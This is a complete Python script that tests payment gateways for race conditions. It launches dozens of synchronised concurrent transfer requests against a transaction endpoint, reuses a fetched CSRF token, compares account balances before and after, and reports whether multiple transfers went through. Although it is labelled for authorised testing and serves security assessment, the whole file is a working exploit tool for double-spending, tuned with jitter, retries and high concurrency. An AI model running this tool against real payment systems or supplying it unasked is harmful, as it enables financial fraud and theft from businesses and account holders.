#!/usr/bin/env python3
"""
Advanced Race Condition Tester for Payment Gateway Security Assessment
Authorized use only - for security testing in controlled environments
"""

import asyncio
import aiohttp
import time
import argparse
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass, asdict
from datetime import datetime
import random

@dataclass
class TestConfig:
    """Configuration for race condition testing"""
    target_url: str
    balance_url: Optional[str] = None
    auth_token: str = "YOUR_TEST_TOKEN"
    amount: float = 100.0
    concurrent_requests: int = 50
    timeout: int = 10
    proxy: Optional[str] = None
    retry_attempts: int = 1
    jitter_ms: int = 0
    verify_balance: bool = False
    
@dataclass
class TestResult:
    """Results from a single test request"""
    request_id: int
    status_code: int
    response_time: float
    success: bool
    response_data: Dict[Any, Any]
    timestamp: datetime
    csrf_token: Optional[str] = None

@dataclass
class BalanceSnapshot:
    """Balance information at a point in time"""
    balance: float
    timestamp: datetime
    raw_response: Dict[Any, Any]

class RaceConditionTester:
    """Advanced race condition tester for payment gateways"""
    
    def __init__(self, config: TestConfig):
        self.config = config
        self.results: List[TestResult] = []
        self.csrf_token: Optional[str] = None
        self.session_cookies: Optional[aiohttp.CookieJar] = None
        self.balance_before: Optional[BalanceSnapshot] = None
        self.balance_after: Optional[BalanceSnapshot] = None
        
    async def get_balance(self, session: aiohttp.ClientSession) -> Optional[BalanceSnapshot]:
        """Fetch current balance from the API"""
        if not self.config.balance_url:
            return None
            
        headers = {
            "Authorization": f"Bearer {self.config.auth_token}",
            "Content-Type": "application/json"
        }
        
        try:
            async with session.get(
                self.config.balance_url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as response:
                data = await response.json()
                
                # Try common balance field names
                balance = None
                for key in ['balance', 'amount', 'available_balance', 'current_balance']:
                    if key in data:
                        balance = float(data[key])
                        break
                
                if balance is None:
                    print(f"[!] Warning: Could not find balance in response: {data}")
                    return None
                    
                return BalanceSnapshot(
                    balance=balance,
                    timestamp=datetime.now(),
                    raw_response=data
                )
        except Exception as e:
            print(f"[!] Error fetching balance: {e}")
            return None
    
    async def get_csrf_token(self, session: aiohttp.ClientSession) -> Optional[str]:
        """Retrieve CSRF token from initial request"""
        headers = {
            "Authorization": f"Bearer {self.config.auth_token}",
            "Content-Type": "application/json"
        }
        
        try:
            # Try to get CSRF token from a GET request to the transaction endpoint
            async with session.get(
                self.config.target_url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as response:
                data = await response.json()
                
                # Check common CSRF token field names
                for key in ['csrf_token', 'token', 'csrfToken', '_token', 'csrf']:
                    if key in data:
                        return data[key]
                
                # Check headers
                if 'X-CSRF-Token' in response.headers:
                    return response.headers['X-CSRF-Token']
                    
        except Exception as e:
            print(f"[*] Could not retrieve CSRF token (may not be required): {e}")
            
        return None
    
    async def send_transaction(self, session: aiohttp.ClientSession, 
                               request_id: int, trigger_event: asyncio.Event) -> TestResult:
        """Send a single transaction request"""
        
        # Apply jitter if configured
        if self.config.jitter_ms > 0:
            jitter = random.uniform(0, self.config.jitter_ms / 1000.0)
            await asyncio.sleep(jitter)
        
        # Wait for trigger event to synchronize all requests
        await trigger_event.wait()
        
        start_time = time.time()
        
        headers = {
            "Authorization": f"Bearer {self.config.auth_token}",
            "Content-Type": "application/json"
        }
        
        # Add CSRF token if available
        if self.csrf_token:
            headers["X-CSRF-Token"] = self.csrf_token
        
        payload = {
            "amount": self.config.amount,
            "transaction_type": "transfer",
            "request_id": request_id,
            "timestamp": datetime.now().isoformat()
        }
        
        # Include CSRF token in payload if needed
        if self.csrf_token:
            payload["csrf_token"] = self.csrf_token
        
        try:
            async with session.post(
                self.config.target_url,
                json=payload,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=self.config.timeout)
            ) as response:
                response_time = time.time() - start_time
                
                try:
                    response_data = await response.json()
                except:
                    response_data = {"text": await response.text()}
                
                return TestResult(
                    request_id=request_id,
                    status_code=response.status,
                    response_time=response_time,
                    success=response.status == 200,
                    response_data=response_data,
                    timestamp=datetime.now(),
                    csrf_token=self.csrf_token
                )
                
        except asyncio.TimeoutError:
            return TestResult(
                request_id=request_id,
                status_code=0,
                response_time=time.time() - start_time,
                success=False,
                response_data={"error": "Timeout"},
                timestamp=datetime.now()
            )
        except Exception as e:
            return TestResult(
                request_id=request_id,
                status_code=0,
                response_time=time.time() - start_time,
                success=False,
                response_data={"error": str(e)},
                timestamp=datetime.now()
            )
    
    async def run_single_race(self, attempt: int = 1) -> List[TestResult]:
        """Execute a single race condition test"""
        print(f"\n[*] Race attempt {attempt}/{self.config.retry_attempts}")
        
        # Event to synchronize all requests
        trigger_event = asyncio.Event()
        
        # Configure connection pooling and proxy
        connector_kwargs = {
            "limit": self.config.concurrent_requests,
            "limit_per_host": self.config.concurrent_requests
        }
        
        connector = aiohttp.TCPConnector(**connector_kwargs)
        
        session_kwargs = {"connector": connector}
        if self.config.proxy:
            session_kwargs["proxy"] = self.config.proxy
            print(f"[*] Using proxy: {self.config.proxy}")
        
        # Reuse cookies across session for session management
        if self.session_cookies is None:
            self.session_cookies = aiohttp.CookieJar()
        session_kwargs["cookie_jar"] = self.session_cookies
        
        async with aiohttp.ClientSession(**session_kwargs) as session:
            # Get CSRF token if this is the first attempt
            if attempt == 1:
                print("[*] Retrieving CSRF token...")
                self.csrf_token = await self.get_csrf_token(session)
                if self.csrf_token:
                    print(f"[+] CSRF token retrieved: {self.csrf_token[:20]}...")
                else:
                    print("[*] No CSRF token found (may not be required)")
            
            # Get balance before if configured
            if self.config.verify_balance and attempt == 1:
                print("[*] Fetching balance before race...")
                self.balance_before = await self.get_balance(session)
                if self.balance_before:
                    print(f"[+] Balance before: {self.balance_before.balance}")
            
            # Create all tasks
            tasks = [
                self.send_transaction(session, i + (attempt - 1) * self.config.concurrent_requests, trigger_event)
                for i in range(self.config.concurrent_requests)
            ]
            
            # Small delay to ensure all coroutines are ready
            await asyncio.sleep(0.1)
            
            print(f"[*] Triggering {self.config.concurrent_requests} simultaneous requests...")
            start = time.time()
            
            # Trigger all requests simultaneously
            trigger_event.set()
            
            # Wait for all requests to complete
            results = await asyncio.gather(*tasks)
            
            elapsed = time.time() - start
            print(f"[*] Race completed in {elapsed:.3f} seconds")
            
            # Get balance after on last attempt
            if self.config.verify_balance and attempt == self.config.retry_attempts:
                print("[*] Fetching balance after race...")
                await asyncio.sleep(1)  # Small delay for transactions to process
                self.balance_after = await self.get_balance(session)
                if self.balance_after:
                    print(f"[+] Balance after: {self.balance_after.balance}")
        
        return results
    
    async def run_race_test(self) -> List[TestResult]:
        """Execute the race condition test with retries"""
        print(f"[*] Starting race condition test at {datetime.now()}")
        print(f"[*] Target: {self.config.target_url}")
        print(f"[*] Concurrent requests per attempt: {self.config.concurrent_requests}")
        print(f"[*] Total attempts: {self.config.retry_attempts}")
        print(f"[*] Amount per request: {self.config.amount}")
        if self.config.jitter_ms > 0:
            print(f"[*] Jitter: 0-{self.config.jitter_ms}ms")
        
        all_results = []
        
        for attempt in range(1, self.config.retry_attempts + 1):
            results = await self.run_single_race(attempt)
            all_results.extend(results)
            
            # Small delay between attempts
            if attempt < self.config.retry_attempts:
                await asyncio.sleep(0.5)
        
        self.results = all_results
        return all_results
    
    def analyze_results(self) -> Dict[str, Any]:
        """Analyze test results for race condition vulnerabilities"""
        successful = [r for r in self.results if r.success]
        failed = [r for r in self.results if not r.success]
        
        analysis = {
            "total_requests": len(self.results),
            "successful_requests": len(successful),
            "failed_requests": len(failed),
            "success_rate": len(successful) / len(self.results) * 100 if self.results else 0,
            "avg_response_time": sum(r.response_time for r in self.results) / len(self.results) if self.results else 0,
            "min_response_time": min(r.response_time for r in self.results) if self.results else 0,
            "max_response_time": max(r.response_time for r in self.results) if self.results else 0,
        }
        
        # Check for race condition indicators
        status_codes = {}
        for result in self.results:
            status_codes[result.status_code] = status_codes.get(result.status_code, 0) + 1
        
        analysis["status_code_distribution"] = status_codes
        
        # Balance verification
        if self.balance_before and self.balance_after:
            balance_change = self.balance_after.balance - self.balance_before.balance
            expected_change = self.config.amount  # Only one transaction should succeed
            
            analysis["balance_verification"] = {
                "before": self.balance_before.balance,
                "after": self.balance_after.balance,
                "change": balance_change,
                "expected_change": expected_change,
                "unexpected_change": abs(balance_change - expected_change) > 0.01
            }
            
            # Race condition detected if balance changed more than expected
            if balance_change > expected_change + 0.01:
                analysis["race_condition_detected"] = True
                analysis["vulnerability_severity"] = "CRITICAL"
                analysis["details"] = f"Balance increased by {balance_change} (expected {expected_change}). Multiple transactions processed!"
            elif len(successful) > 1:
                analysis["race_condition_detected"] = True
                analysis["vulnerability_severity"] = "HIGH"
                analysis["details"] = f"Multiple concurrent transactions succeeded: {len(successful)}"
            else:
                analysis["race_condition_detected"] = False
                analysis["vulnerability_severity"] = "NONE"
        else:
            # Fallback to success count analysis
            if len(successful) > 1:
                analysis["race_condition_detected"] = True
                analysis["vulnerability_severity"] = "HIGH"
                analysis["details"] = f"Multiple concurrent transactions succeeded: {len(successful)}"
            else:
                analysis["race_condition_detected"] = False
                analysis["vulnerability_severity"] = "NONE"
        
        return analysis
    
    def print_report(self, analysis: Dict[str, Any]):
        """Print detailed test report"""
        print("\n" + "="*70)
        print("RACE CONDITION TEST REPORT")
        print("="*70)
        print(f"Total Requests: {analysis['total_requests']}")
        print(f"Successful: {analysis['successful_requests']}")
        print(f"Failed: {analysis['failed_requests']}")
        print(f"Success Rate: {analysis['success_rate']:.2f}%")
        print(f"\nResponse Times:")
        print(f"  Average: {analysis['avg_response_time']:.3f}s")
        print(f"  Min: {analysis['min_response_time']:.3f}s")
        print(f"  Max: {analysis['max_response_time']:.3f}s")
        print(f"\nStatus Code Distribution:")
        for code, count in analysis['status_code_distribution'].items():
            print(f"  {code}: {count}")
        
        # Balance verification results
        if 'balance_verification' in analysis:
            bv = analysis['balance_verification']
            print(f"\nBalance Verification:")
            print(f"  Before: {bv['before']}")
            print(f"  After: {bv['after']}")
            print(f"  Change: {bv['change']} (expected: {bv['expected_change']})")
            if bv['unexpected_change']:
                print(f"  ⚠️  UNEXPECTED BALANCE CHANGE DETECTED!")
        
        print(f"\n{'='*70}")
        print(f"Race Condition Detected: {analysis['race_condition_detected']}")
        print(f"Vulnerability Severity: {analysis['vulnerability_severity']}")
        if 'details' in analysis:
            print(f"Details: {analysis['details']}")
        print("="*70 + "\n")
    
    def save_results(self, analysis: Dict[str, Any], filename: Optional[str] = None):
        """Save detailed results to file"""
        if filename is None:
            filename = f"race_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        output = {
            "config": asdict(self.config),
            "analysis": analysis,
            "results": [
                {
                    "request_id": r.request_id,
                    "status_code": r.status_code,
                    "response_time": r.response_time,
                    "success": r.success,
                    "timestamp": r.timestamp.isoformat(),
                    "response_data": r.response_data
                }
                for r in self.results
            ]
        }
        
        with open(filename, 'w') as f:
            json.dump(output, f, indent=2)
        
        print(f"[+] Results saved to: {filename}")

def parse_args():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description="Advanced Race Condition Tester for Payment Gateway Security Assessment",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic test
  %(prog)s -u https://api.example.com/transaction -t YOUR_TOKEN
  
  # Test with balance verification
  %(prog)s -u https://api.example.com/transaction -b https://api.example.com/balance -t YOUR_TOKEN --verify-balance
  
  # Test through Burp Suite proxy with retries
  %(prog)s -u https://api.example.com/transaction -t YOUR_TOKEN --proxy http://127.0.0.1:8080 --retry 10
  
  # High-intensity test with jitter
  %(prog)s -u https://api.example.com/transaction -t YOUR_TOKEN -c 100 --retry 20 --jitter 50
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target transaction URL')
    parser.add_argument('-b', '--balance-url', help='Balance check URL (optional)')
    parser.add_argument('-t', '--token', required=True, help='Authentication token')
    parser.add_argument('-a', '--amount', type=float, default=100.0, help='Transaction amount (default: 100.0)')
    parser.add_argument('-c', '--concurrent', type=int, default=50, help='Concurrent requests per attempt (default: 50)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080 for Burp)')
    parser.add_argument('--retry', type=int, default=1, help='Number of race attempts (default: 1)')
    parser.add_argument('--jitter', type=int, default=0, help='Random jitter in milliseconds (default: 0)')
    parser.add_argument('--verify-balance', action='store_true', help='Verify balance before and after')
    parser.add_argument('-o', '--output', help='Output file for results (default: auto-generated)')
    
    return parser.parse_args()

async def main():
    """Main execution function"""
    
    args = parse_args()
    
    # Create configuration from arguments
    config = TestConfig(
        target_url=args.url,
        balance_url=args.balance_url,
        auth_token=args.token,
        amount=args.amount,
        concurrent_requests=args.concurrent,
        timeout=args.timeout,
        proxy=args.proxy,
        retry_attempts=args.retry,
        jitter_ms=args.jitter,
        verify_balance=args.verify_balance
    )
    
    # Create tester instance
    tester = RaceConditionTester(config)
    
    # Run the test
    results = await tester.run_race_test()
    
    # Analyze and report
    analysis = tester.analyze_results()
    tester.print_report(analysis)
    
    # Save results
    tester.save_results(analysis, args.output)

if __name__ == "__main__":
    asyncio.run(main())